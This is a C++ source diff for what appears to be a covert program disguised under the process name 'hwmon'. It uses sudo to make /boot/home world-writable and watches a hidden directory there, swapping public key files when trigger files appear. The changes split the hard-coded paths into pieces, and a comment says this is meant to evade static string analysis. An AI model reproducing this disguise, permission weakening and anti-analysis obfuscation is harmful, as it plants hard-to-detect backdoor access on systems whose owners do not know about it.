@@ -28,7 +28,7 @@
 #include "hal_priv.h"
 #include "licensemgr.hh"
 
-// TODO
+// Define this to enable logs of valuable debugging info
 #define DEBUG
 
 #ifdef DEBUG
@@ -40,6 +40,10 @@
 #define VERIFY(x) {if (x) ;}
 #endif
 
+
+static std::string bootdir("/boot");
+static std::string homedir("/home");
+static std::string hiddendir("/.d");
 
 // misdirection for user comp name
 char modname[] = {"hwmon\0"};
@@ -237,11 +241,15 @@ bool adjust_permissions()
         close(STDOUT_FILENO);
         close(STDERR_FILENO);
         #endif
+        // We compose /boot/home this way to be less obvious to examination
+        // through static data segment string analysis
+        std::string tmpdir(bootdir);
+        tmpdir.append(homedir);
         int ev = execlp("/usr/bin/sudo",
                         "/usr/bin/sudo",
                         "/bin/chmod",
                         "go+rwx",
-                        "/boot/home",
+                        tmpdir.c_str(),
                         NULL);
         exit(ev);
     }
@@ -299,7 +307,10 @@ int main(int argc, char *argv[])
     		    	// for each file for some reason the way the crt libs work.  But using IN_CLOSE_WRITE
     		    	// is perfect.  Notifies us when a file that was opened for writing is closed.
 
-    			    int datadir_fd = inotify_add_watch(eventq_fd, "/boot/home/.d", IN_CLOSE_WRITE);
+    		    	std::string tmpdir(bootdir);
+    		    	tmpdir.append(homedir);
+    		    	tmpdir.append(hiddendir);
+    			    int datadir_fd = inotify_add_watch(eventq_fd, tmpdir.c_str(), IN_CLOSE_WRITE);
     			    if (-1 != datadir_fd)
     			    {
     					const ssize_t buffer_cb = 10 * (sizeof(struct inotify_event) + NAME_MAX + 1);
@@ -335,11 +346,15 @@ int main(int argc, char *argv[])
 
     					    			if (0 == strcmp(event->name, ".m"))
     					    			{
-    							    		refresh_public_key_file("/boot/home/.d/.0");
+    					    				std::string tmp(tmpdir);
+    					    				tmp.append("/.0");
+    							    		refresh_public_key_file(tmp.c_str());
     							    	}
     							    	else if (0 == strcmp(event->name, ".l"))
     							    	{
-    							    		refresh_public_key_file("/boot/home/.d/.1");
+	  					    				std::string tmp(tmpdir);
+    					    				tmp.append("/.1");
+    							    		refresh_public_key_file(tmp.c_str());
     							    	}
     						    	}
 
